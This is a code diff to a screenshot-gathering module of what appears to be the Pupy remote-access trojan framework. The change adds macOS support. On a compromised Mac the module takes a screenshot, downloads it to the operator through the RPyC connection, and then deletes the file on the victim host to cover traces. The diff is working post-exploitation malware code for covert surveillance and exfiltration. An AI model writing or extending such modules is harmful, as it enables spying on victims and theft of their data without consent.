@@ -24,6 +24,7 @@ import datetime
 from zlib import compress, crc32
 import struct
 import subprocess
+from rpyc.utils.classic import download
 
 __class_name__="Screenshoter"
 
@@ -37,7 +38,7 @@ def pil_save(filename, pixels, width, height):
     logging.info('Screenshot saved to %s'%filename)
 
 
-@config(cat="gather", compat="windows")
+@config(cat="gather", compat=["windows", "darwin"])
 class Screenshoter(PupyModule):
     """ take a screenshot :) """
 
@@ -48,29 +49,43 @@ class Screenshoter(PupyModule):
         self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open the default image viewer on the screenshot for preview')
 
     def run(self, args):
-        try:
-            os.makedirs(os.path.join("data","screenshots"))
-        except Exception:
-            pass
-        self.client.load_package("pupwinutils.screenshot")
-        screens=None
-        if args.screen is None:
-            screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors(oneshot=True)
-        else:
-            screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors()
-        if args.enum:
-            res=""
-            for i, screen in enumerate(screens):
-                res+="{:<3}: {}\n".format(i,screen)
-            return res
-        if args.screen is None:
-            args.screen=0
-        selected_screen=screens[args.screen]
-        screenshot_pixels=self.client.conn.modules["pupwinutils.screenshot"].get_pixels(selected_screen)
-        filepath=os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
-        pil_save(filepath, screenshot_pixels, selected_screen["width"], selected_screen["height"])
-        if args.view:
-            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
-        self.success("screenshot saved to %s"%filepath)
+        if self.client.is_windows():
+            try:
+                os.makedirs(os.path.join("data","screenshots"))
+            except Exception:
+                pass
+            self.client.load_package("pupwinutils.screenshot")
+            screens=None
+            if args.screen is None:
+                screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors(oneshot=True)
+            else:
+                screens=self.client.conn.modules['pupwinutils.screenshot'].enum_display_monitors()
+            if args.enum:
+                res=""
+                for i, screen in enumerate(screens):
+                    res+="{:<3}: {}\n".format(i,screen)
+                return res
+            if args.screen is None:
+                args.screen=0
+            selected_screen=screens[args.screen]
+            screenshot_pixels=self.client.conn.modules["pupwinutils.screenshot"].get_pixels(selected_screen)
+            filepath=os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
+            pil_save(filepath, screenshot_pixels, selected_screen["width"], selected_screen["height"])
+            if args.view:
+                subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
+            self.success("screenshot saved to %s"%filepath)
 
-
+        # for mac os x
+        elif self.client.is_darwin():
+            self.client.load_package("screenshot")
+            ok, message = self.client.conn.modules['screenshot'].screenshot()
+            if ok: 
+                self.success('screenshot stored on the remote host in %s' % message)
+                self.success('downloading file')
+                filepath = os.path.join("data","screenshots","scr_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".png")
+                download(self.client.conn, message, filepath)
+                self.success('removing remote file')
+                self.client.conn.modules.os.remove(message)
+                self.success("screenshot saved to %s" % filepath)
+            else:
+                self.error(message)
